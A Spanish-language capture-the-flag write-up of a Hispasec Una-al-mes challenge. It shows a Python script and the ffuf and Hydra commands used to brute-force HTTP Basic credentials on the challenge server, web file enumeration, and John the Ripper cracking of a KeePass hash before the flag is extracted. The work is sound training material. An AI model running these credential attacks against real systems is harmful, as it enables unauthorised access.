# Propuesta de solución del reto Una-al-mes de junio de 2020 de Hispasec por Ramón Sola ([@asterixco](https://twitter.com/asterixco))

En este segundo desafío de los tres inspirados en la famosa serie “Breaking Bad”, el enfoque cambia significativamente respecto a retos anteriores.

## Enunciado

El planteamiento es el siguiente:

> Tras infiltrarse en la infraestructura de la DEA, Hank ha conseguido pivotar a uno de los objetivos más jugosos del sistema: el ordenador del becario.
>
> Seguramente, estará lleno de información confidencial que el novato se ha olvidado de ocultar.
>
> O tal vez haya hecho bien su trabajo, quién sabe.

Se indica <http://34.253.120.147:1729> como URL de entrada.

## Si eres amigo, puedes entrar

Nada más acceder con un navegador, se presenta una ventana de petición de usuario y contraseña que puede venir acompañada por la leyenda “Contenido protegido por El Becario”. El servidor había enviado un código de respuesta 401 (*Unauthorized*) y la cabecera [WWW-Authenticate](https://developer.mozilla.org/docs/Web/HTTP/Headers/WWW-Authenticate):

```text
HTTP/1.1 401 Unauthorized
Date: Mon, 15 Jun 2020 15:59:05 GMT
Server: Apache/2.4.43 (Unix)
WWW-Authenticate: Basic realm="Contenido protegido por El Becario"
Content-Length: 381
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
```

La [autenticación HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication) básica consiste en codificar un par **usuario:contraseña**, separados por dos puntos, en Base64 para construir una cabecera **Authorization** con la palabra clave *Basic*. Por ejemplo, los clásicos **admin** y **1234** dan lugar a `Authorization: Basic YWRtaW46MTIzNA==`.

Puesto que no hay más información que permita deducir las credenciales correctas, se decide probar distintas combinaciones con herramientas de *fuzzing* o de ataques mediante diccionario. La dificultad reside en escoger las listas adecuadas. El recurso elegido ha sido el repositorio [SecLists](https://github.com/danielmiessler/SecLists) una vez más.

El total de posibilidades viene determinado por el [producto cartesiano](https://es.wikipedia.org/wiki/Producto_cartesiano), es decir, el conjunto que resulta de emparejar cada usuario con todas las contraseñas. Parece razonable optar en un principio por repertorios no muy extensos. *RockYou* sería inviable, por ejemplo. Como primera elección se van a tomar **top-usernames-shortlist.txt** y **cirt-default-usernames.txt** para los nombres de usuario, y **10-million-password-list-top-500.txt** y **10k-most-common.txt** para las contraseñas, aun admitiendo la existencia de elementos comunes (y, por tanto, intentos duplicados) entre ellas.

Si se pretende usar herramientas genéricas como [wfuzz](https://wfuzz.io) o [ffuf](https://github.com/ffuf/ffuf), se necesita un paso previo de transformación. En cambio, una herramienta especializada como [Hydra](https://github.com/vanhauser-thc/thc-hydra) recibe las dos listas de forma independiente.

### Generación manual de las cabeceras Authorization

El repositorio [ffuf-scripts](https://github.com/ffuf/ffuf-scripts) contiene un *script* de *shell* que genera la codificación en Base64 de todos los emparejamientos posibles entre dos listas. Sin embargo, exhibe un rendimiento pobre con ficheros formados por miles de líneas. Se ofrece a continuación una alternativa en Python que pretende ser más eficiente.

```python
#! /usr/bin/env python3

import sys
import base64

def main():
    if len(sys.argv) < 2:
        sys.exit('Two args required')

    with open(sys.argv[1], 'r') as fuser:
        users = fuser.readlines()
    with open(sys.argv[2], 'r') as fpass:
        pwds = fpass.readlines()

    nusers = len(users)
    npwds = len(pwds)
    print(f'Users: {nusers}', file=sys.stderr)
    print(f'Passwords: {npwds}', file=sys.stderr)
    print(f'Combinations: {nusers*npwds}', file=sys.stderr)

    for pwd in pwds:
        p = pwd.rstrip('\n')
        for user in users:
            u = user.rstrip('\n')
            print(base64.b64encode(f'{u}:{p}'.encode('utf8')).decode('ascii'))


if __name__ == '__main__':
    main()
```

El programa carga ambas listas de golpe en memoria. Si alguna de ellas fuese muy extensa, podría acarrear lentitud en el sistema o errores de agotamiento de recursos. La lectura con *readlines* conserva los caracteres de final de línea, por lo que se aplica [rstrip](https://docs.python.org/3/library/stdtypes.html#str.rstrip) para eliminarlos. El código tal vez requiera adaptaciones que dependen de la plataforma subyacente, en función de posibles variaciones en las codificaciones de caracteres o los tipos de saltos de línea.

Ninguna de las combinaciones usadas arroja un resultado positivo, por desgracia. Sin embargo, se sabe que el becario no se complica la vida. Supóngase que el nombre de usuario fuese el más evidente: **becario**. También podría intuirse que el [autor del reto](https://unaaldia.hispasec.com/author/plopezzz) hubiera dejado su impronta. Por tanto, se crea un fichero con solo dos líneas: **becario** y **pablo**. Su emparejamiento con un diccionario de 10000 contraseñas genera 20000 elementos, una cantidad muy razonable. La denominación `basicauth.py` corresponde al programa de Python presentado.

```text
$ cat myusers
becario
pablo
$ ./basicauth.py myusers 10k-most-common.txt > auth2.txt
Users: 2
Passwords: 10000
Combinations: 20000
```

Se usa el parámetro `-t 300` de *ffuf* por sugerencia de Luis Vacas ([@cybervaca_](https://twitter.com/cybervaca_)) con el fin de acelerar la búsqueda, aunque suponga una carga adicional para el servidor web. Como diría la famosa leyenda de advertencia en la publicidad, “rodado por especialistas en circuito cerrado”. Los experimentos, con gaseosa.

La lotería de credenciales, ahora sí, anuncia una combinación ganadora.

```text
$ ffuf -u http://34.253.120.147:1729/ -H "Authorization: Basic AUTH" -fc 401 -mc all -w auth2.txt:AUTH -t 300

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://34.253.120.147:1729/
 :: Header           : Authorization: Basic AUTH
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: all
 :: Filter           : Response status: 401
________________________________________________

YmVjYXJpbzpyaWNhcmRv    [Status: 200, Size: 1300, Words: 155, Lines: 26]
:: Progress: [20000/20000] :: Job [1/1] :: 4000 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
$ echo YmVjYXJpbzpyaWNhcmRv | base64 -d
becario:ricardo
```

La corazonada sobre el usuario **becario** es correcta, con contraseña **ricardo**.  Obsérvese cómo hay que decodificar la solución, la única petición que no ha devuelto un error 401.

### Ataques por diccionario con Hydra

La herramienta *Hydra*, ya mencionada, es otra opción. El fichero de usuarios se indica mediante la opción `-L` y el de contraseñas con `-P`. Las variantes en minúsculas permiten especificar un valor único; por tanto, `-l becario` (ele minúscula) habría probado en exclusiva el usuario **becario** con todas las contraseñas del fichero que acompaña a `-P`.

Como la lista de usuarios es corta, se propone invertir mediante `-u` el orden de anidamiento, de manera que se prueban todas las claves con el primer usuario, después todas con el segundo y así sucesivamente si hubiera más. El parámetro `-f` termina la ejecución tras el primer resultado positivo. Además, se amplía el número de tareas predeterminado con `-t 64`; de nuevo, se recomienda **no hacer en casa sin una supervisión especializada**.

```text
$ hydra -L myusers -P 10k-most-common.txt -u http-get://34.253.120.147:1729/ -f -t 64
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-17 09:36:07
[DATA] max 64 tasks per 1 server, overall 64 tasks, 20000 login tries (l:2/p:0), ~10000 tries per task
[DATA] attacking http-get://34.253.120.147:1729/
[STATUS] 2357.00 tries/min, 2357 tries in 00:00h, 0 to do in 01:00h, 17643 active
[1729][http-get] host: 34.253.120.147   login: becario   password: ricardo
[STATUS] attack finished for 34.253.120.147 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-17 09:37:47
```

No sorprende en absoluto conseguir el mismo resultado.

```text
[1729][http-get] host: 34.253.120.147   login: becario   password: ricardo
```

## Las llaves del becario

La página índice protegida con las credenciales encontradas presenta el siguiente aspecto:

![La dura vida del becario](dura_vida_de_becario.png)

Sin duda, el bisoño protagonista posee grandes cualidades para la escritura.

> **Principales escollos**
>
> **Durante el desenvolvimiento de sus tareas, los becarios se enfrentan a duros condicionantes a los que deben sobreponerse para superar su bautismo y ser aceptados por el resto del clan**
>
> - Elaboración del café
>
>     La correcta elaboración de esta bebida resulta crucial. Sin el consumo de esta sustancia, los IT Manager no podrían supervisar correctamente la ingente cantidad de variables que a diario manejan.
>
> - Elaboración de informes
>
>     Una tarea tradicionalmente denostada por el clan, pero de vital importancia. Los humanos no-IT, también llamados muggles, a menudo necesitan códigos de colores y amables grafismos para alcanzar a intuir la profundidad de la información.
>
> - Elaboración de pruebas CTF
>
>     En ocasiones, tan sólo a los becarios más excepcionales y poderosos, el clan les concede la posibilidad de elaborar pruebas de CTF. A menudo, esto es aprovechado por los becarios para ajusticiar a sus compañeros

El texto se acompaña con una viñeta que pertenece a la historieta “[6 motivos por los que ser becario es un infierno](https://www.eljueves.es/temazo/motivos-por-los-que-ser-becario-infierno_1060)” de la revista humorística *El Jueves*.

No se aprecia nada fuera de lo común en el código HTML.

```html
<html>
<head>
<link rel="stylesheet" type="text/css" href="BecarioStyle.css">
<meta charset="UTF-8">
</head>
<body>
<div class="row">
  <div class="column">
    <h1>Principales escollos</h1>
    <h3>Durante el desenvolvimiento de sus tareas, los becarios se enfrentan a duros condicionantes a los que deben sobreponerse para superar su bautismo y ser aceptados por el resto del clan</h3>
    <ul>
    <li>Elaboración del café</li>
    <p>La correcta elaboración de esta bebida resulta crucial. Sin el consumo de esta sustancia, los IT Manager no podrían supervisar correctamente la ingente cantidad de variables que a diario manejan.</p>
    <li>Elaboración de informes</li>
    <p>Una tarea tradicionalmente denostada por el clan, pero de vital importancia. Los humanos no-IT, también llamados muggles, a menudo necesitan códigos de colores y amables grafismos para alcanzar a intuir la profundidad de la información.</p>
    <li>Elaboración de pruebas CTF</li>
    <p>En ocasiones, tan sólo a los becarios más excepcionales y poderosos, el clan les concede la posibilidad de elaborar pruebas de CTF. A menudo, esto es aprovechado por los becarios para ajusticiar a sus compañeros</p>
    </ul>
  </div>
  <div class="column">
    <img src="BecarioEstresado.jpeg" alt="Nature" class="responsive">
  </div>
</div>
</body>
</html>
```

La hoja de estilos **BecarioStyle.css** tampoco revela rasgos sospechosos.

```css
.row {
  display: flex;
}

.column {
  flex: 50%;
}

.responsive {
  width: 100%;
  height: auto;
}

ul {
  list-style-type: circle;
font-family: "Courier New" ;
font-size: 18px ;
}

p {
font-family: "Courier New";
font-size: 15px ;
}

h1 {
  font-family: "Courier New";
  font-size: 26px ;
  }

  h3 {
    font-family: "Courier New";
    font-size: 15px ;
    }
```

Solo queda por analizar la imagen **BecarioEstresado.jpeg**, que podría esconder algún tipo de información. El texto alternativo “Nature” se entiende como una demostración más de la guasa que destila la infeliz estrella del desafío.

![Becario estresado](BecarioEstresado.jpeg)

La herramienta *file* estándar o [ExifTool](https://exiftool.org) son suficientes para desvelar un misterio oculto a plena vista: la etiqueta COM (*comment*) del formato JPEG que, en un visor o editor hexadecimal, se reconocería por los bytes `FF FE`.

```text
$ file BecarioEstresado.jpeg
BecarioEstresado.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, comment: "BecarioForPresident.kdbx", baseline, precision 8, 850x527, components 3
$ exiftool BecarioEstresado.jpeg
ExifTool Version Number         : 11.16
File Name                       : BecarioEstresado.jpeg
Directory                       : .
File Size                       : 74 kB
File Modification Date/Time     : 2020:06:15 10:15:31+02:00
File Access Date/Time           : 2020:06:17 10:05:08+02:00
File Inode Change Date/Time     : 2020:06:17 10:05:08+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Comment                         : BecarioForPresident.kdbx
Image Width                     : 850
Image Height                    : 527
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 850x527
Megapixels                      : 0.448
```

La ruta <http://34.253.120.147:1729/BecarioForPresident.kdbx> existe y conduce a un almacén de contraseñas de [KeePass](https://keepass.info), formato también usado por [KeePassX](https://www.keepassx.org), [KeePassXC](https://keepassxc.org) y otros gestores compatibles.

```text
$ file BecarioForPresident.kdbx
BecarioForPresident.kdbx: Keepass password database 2.x KDBX
```

### Un paso en falso: más diccionarios

Resulta tentador intentar romper de primeras la posible clave que protege la base de datos con herramientas como Hashcat o [John the Ripper](https://www.openwall.com/john/). Se opta por el segundo debido a dificultades técnicas con el primero.

El ejecutable principal de JtR no procesa por sí mismo los ficheros de KeePass. La herramienta *keepass2john* que forma parte de la distribución completa extrae los parámetros de cifrado de una manera que John entienda: `keepass2john BecarioForPresident.kdbx`.

```text
BecarioForPresident:$keepass$*2*60000*0*97050ee4615e1688faf7f1710a29cb060737beeaf4e2414da7b37f16b3f8e0d6*3df8ee3ff236416862a9161c5a815d29822e95dff4fc74efc004c9add3aab31b*d3986a197eba1ef597c4984a0bd3d749*963d5041981cf2c179e34a3a6845363f71eb937ada53ae26fa8477bc0739cd9e*7a5b5559b318d0822daf33fb5506be6fde462c718e8813a53695366621144477
```

De este modo, el ataque se iniciaría con `keepass2john BecarioForPresident.kdbx > hash` seguido de `john --wordlist=xxx hash`, donde *xxx* fuese el fichero con la lista de palabras que se desease probar.

```text
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
Use the "--format=KeePass-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/32])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Pronto se comprende que este esfuerzo es inútil. El becario **no se complica la vida con las contraseñas**.

### Otras miguitas de pan

Una enumeración de recursos web con la lista **raft-large-files.txt** descubre un **todo.txt**. Nótese cómo se inyecta la cabecera **Authorization** apropiada.

```text
$ ffuf -u http://34.253.120.147:1729/FUZZ -H "Authorization: Basic YmVjYXJpbzpyaWNhcmRv" -fc 404 -mc all -w raft-large-files.txt -t 300

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://34.253.120.147:1729/FUZZ
 :: Header           : Authorization: Basic YmVjYXJpbzpyaWNhcmRv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

index.html              [Status: 200, Size: 1300, Words: 155, Lines: 26]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8]
.html                   [Status: 403, Size: 199, Words: 14, Lines: 8]
.                       [Status: 200, Size: 1300, Words: 155, Lines: 26]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8]
.htm                    [Status: 403, Size: 199, Words: 14, Lines: 8]
.htpasswds              [Status: 403, Size: 199, Words: 14, Lines: 8]
.htgroup                [Status: 403, Size: 199, Words: 14, Lines: 8]
.htaccess.bak           [Status: 403, Size: 199, Words: 14, Lines: 8]
.htuser                 [Status: 403, Size: 199, Words: 14, Lines: 8]
.ht                     [Status: 403, Size: 199, Words: 14, Lines: 8]
.htc                    [Status: 403, Size: 199, Words: 14, Lines: 8]
todo.txt                [Status: 200, Size: 80, Words: 14, Lines: 4]
.htaccess.old           [Status: 403, Size: 199, Words: 14, Lines: 8]
.htacess                [Status: 403, Size: 199, Words: 14, Lines: 8]
:: Progress: [37042/37042] :: Job [1/1] :: 3704 req/sec :: Duration: [0:00:10] :: Errors: 1 ::
```

Ya se vio al principio que el servidor web se identifica como Apache. Los nombres de los recursos prohibidos así parecen justificarlo. Esos resultados se habrían suprimido con `-fc 404,403`. La descarga de <http://34.253.120.147:1729/todo.txt> conduce a una sencilla lista de tareas.

```text
$ cat todo.txt
- Hacer el reto de la UAM (hecho)
- Limpiar la cafetera (hecho)
- Stego (hecho)
```

El becario será descuidado en algunos aspectos, pero sin duda también muy organizado. No debe descartarse que alguna de las muestras recogidas hasta ahora constituyese una “[Mickey-herramienta](https://es.wikipedia.org/wiki/La_casa_de_Mickey_Mouse)” misteriosa que pudiera servir luego.

La búsqueda de posibles recursos adicionales con sufijos típicos de copias antiguas como *~*, *.bak* y *.old* no reporta novedades. No obstante, a pesar de su aparente inexperiencia y suponiendo que la *flag* estuviera oculta en algún rincón del servidor web, el becario se ha cuidado mucho de no darle un nombre o una ubicación **demasiado** obvios.

### Más vale maña que fuerza (bruta)

El fichero **BecarioForPresident.kdbx** se puede abrir con el propio KeePass o una de sus múltiples alternativas. Se ha preferido buscar una herramienta basada en línea de comandos e interfaz de texto, y se ha elegido [kpcli](http://kpcli.sourceforge.net). La versión 3.4 es la última disponible en el momento de resolver este reto. Su README contiene entre otros el siguiente aviso:

> CAVEATS AND WORDS OF CAUTION
>
> The main author of kpcli primarily interoperability tests with KeePassX
> (<http://www.keepassx.org/>) and primarily uses KeePass v1 (\*.kdb) files.
> Support for KeePass v2 (\*.kdbx) files in kpcli is substantial, and many
> people use it daily, but it is not the author's primary use case. It is
> also the author's intent to maintain compatibility with v1 files, and
> so anyone sending patches, for consideration for inclusion in future
> kpcli versions, is asked to validate them with both v1 and v2 files.

En resumen, el uso principal por parte del autor atañe a la versión 1 de las bases de datos, por lo que el soporte para archivos de la versión 2 es limitado. También existe un problema conocido por el que la orden *show* muestra contraseñas distorsionadas en algunos sistemas: “[#24 kdbx files: Passwords are garbled when doing 'show'](https://sourceforge.net/p/kpcli/bugs/24/)”.

El *script* **kpcli-3.4.pl** requiere el [entorno de ejecución de Perl y algunas bibliotecas adicionales](https://sourceforge.net/p/kpcli/wiki/Installation%20instructions/). Cuando se le da el fichero .kdbx con el parámetro `--kdb`, solicita la contraseña principal, que es desconocida. Al dejarla en blanco, comunica que no puede cargar el archivo.

```text
$ ./kpcli-3.4.pl --kdb=BecarioForPresident.kdbx
Please provide the master password: *************************
Couldn't load the file BecarioForPresident.kdbx: Missing pass
```

KeePass provee protección mediante una clave convencional, un fichero “llave” o incluso ambos. Es necesario aportar el elemento correcto para conseguir descifrar la base de datos. ¿Estaría esa llave, que se especifica con el parámetro `--key`, entre alguno de los artefactos obtenidos? Se intenta además con la contraseña vacía.

```text
$ ./kpcli-3.4.pl --kdb=BecarioForPresident.kdbx --key=index.html
Please provide the master password: *************************
Couldn't load the file BecarioForPresident.kdbx: The database key appears invalid or else the database is corrupt.
$ ./kpcli-3.4.pl --kdb=BecarioForPresident.kdbx --key=BecarioStyle.css
Please provide the master password: *************************
Couldn't load the file BecarioForPresident.kdbx: The database key appears invalid or else the database is corrupt.
$ ./kpcli-3.4.pl --kdb=BecarioForPresident.kdbx --key=todo.txt
Please provide the master password: *************************
Couldn't load the file BecarioForPresident.kdbx: The database key appears invalid or else the database is corrupt.
```

Falta probar **BecarioEstresado.jpeg**. En las escenas de acción del cine y la televisión no es raro que precisamente la última opción salve una situación crítica tras múltiples intentos sin éxito.

```text
$ ./kpcli-3.4.pl --kdb=BecarioForPresident.kdbx --key=BecarioEstresado.jpeg
Please provide the master password:
```

Esta llave permite por fin desbloquear la caja fuerte sin necesidad de contraseña.

```text
Please provide the master password: *************************

KeePass CLI (kpcli-3.4) v3.4 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.
kpcli-3.4:/>
```

Las órdenes de **kpcli** que facilitan la navegación por el almacén exhiben nombres tan familiares como `ls` y `cd`.

```text
kpcli-3.4:/> ls
=== Groups ===
BecarioForPresident/
kpcli-3.4:/> cd BecarioForPresident
kpcli-3.4:/BecarioForPresident>
```

Dentro del grupo **BecarioForPresident**, una entrada llamada **flag.bk** parece prometedora.

```text
kpcli-3.4:/BecarioForPresident> ls
=== Groups ===
General/
Recycle Bin/
=== Entries ===
0. flag.bk
```

La orden `show` muestra las propiedades de una entrada. Sin la opción `-f`, la contraseña se oculta con texto rojo sobre fondo rojo, de forma que no se vea en pantalla pero sí se pueda seleccionar en el terminal para copiarla al portapapeles.

```text
kpcli:/BecarioForPresident> help show
show: Show an entry: show [-f] [-a] <entry path|entry number>

The show command tries to intelligently determine
what you want to see and to make it easy to display.
Show can take a path to an entry as its argument or
an entry number as shown by the ls command.

When using entry numbers, they will refer to the last
path when an ls was performed or pwd if ls has not
yet been run.

By default, passwords are "hidden" by being displayed as
"red on red" where they can be copied to the clip board
but not seen. Provide the -f option to show passwords.
Use the -a option to see create and modified times, and
the index of the icon set for the entry.
```

Hay una cadena alfanumérica almacenada como contraseña.

```text
kpcli-3.4:/BecarioForPresident> show -f flag.bk

 Path: /BecarioForPresident/
Title: flag.bk
Uname:
 Pass: NhdjP5w7n5HZh3t3MEx6
  URL:
Notes:
```

¿No se suponía que el becario elegía claves y nombres fáciles? Tal vez se generó de manera automática.

```text
kpcli-3.4:/BecarioForPresident> ls General
kpcli-3.4:/BecarioForPresident> ls Recycle\ Bin
kpcli-3.4:/BecarioForPresident> quit
```

No hay nada más que ver aquí.

## Diversión con banderas

**NhdjP5w7n5HZh3t3MEx6** desde luego no es una *flag* de la Una-al-mes y tampoco tiene sentido como cadena codificada en Base64. Sin embargo, **flag.bk** sugiere de todos modos el nombre de un fichero. Al acceder a la dirección <http://34.253.120.147:1729/flag.bk>, se advierte que apunta a un recurso válido. De no ser por esa extensión *.bk* inusual, se habría encontrado rápidamente.

```text
$ ffuf -u http://34.253.120.147:1729/FUZZ.bk -H "Authorization: Basic YmVjYXJpbzpyaWNhcmRv" -fc 404,403 -mc all -w raft-large-words.txt -t 300

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://34.253.120.147:1729/FUZZ.bk
 :: Header           : Authorization: Basic YmVjYXJpbzpyaWNhcmRv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404,403
________________________________________________

flag                    [Status: 200, Size: 393, Words: 2, Lines: 5]
:: Progress: [119600/119600] :: Job [1/1] :: 3417 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```

En realidad, se trata de un archivo comprimido ZIP.

```text
$ file flag.bk
flag.bk: Zip archive data, at least v1.0 to extract
$ unzip -l flag.bk
Archive:  flag.bk
  Length      Date    Time    Name
---------  ---------- -----   ----
      204  2020-06-12 16:03   flag.zip
---------                     -------
      204                     1 file
```

Está protegido por una contraseña.

```text
$ unzip flag.bk
Archive:  flag.bk
[flag.bk] flag.zip password:
   skipping: flag.zip                incorrect password
```

Por supuesto, no cabe otra opción que **NhdjP5w7n5HZh3t3MEx6**.

```text
$ unzip flag.bk
Archive:  flag.bk
[flag.bk] flag.zip password:
 extracting: flag.zip
```

El resultado es un fichero ZIP que contiene presuntamente la ansiada *flag*.

```text
$ file flag.zip
flag.zip: Zip archive data, at least v1.0 to extract
$ unzip -l flag.zip
Archive:  flag.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       38  2020-06-10 14:23   flag.txt
---------                     -------
       38                     1 file
```

No se requiere clave esta vez y se obtiene una solución directa.

```text
$ unzip flag.zip
Archive:  flag.zip
 extracting: flag.txt
$ cat flag.txt
UAM{faa9fdc74f61513f31bc1dc97dd52f41}
```

Por tanto, la *flag* es **UAM{faa9fdc74f61513f31bc1dc97dd52f41}**. La página <https://www.md5online.org/md5-decrypt.html> confirma que el *hash* MD5 se corresponde con la cadena **ElBecarioCrece**.
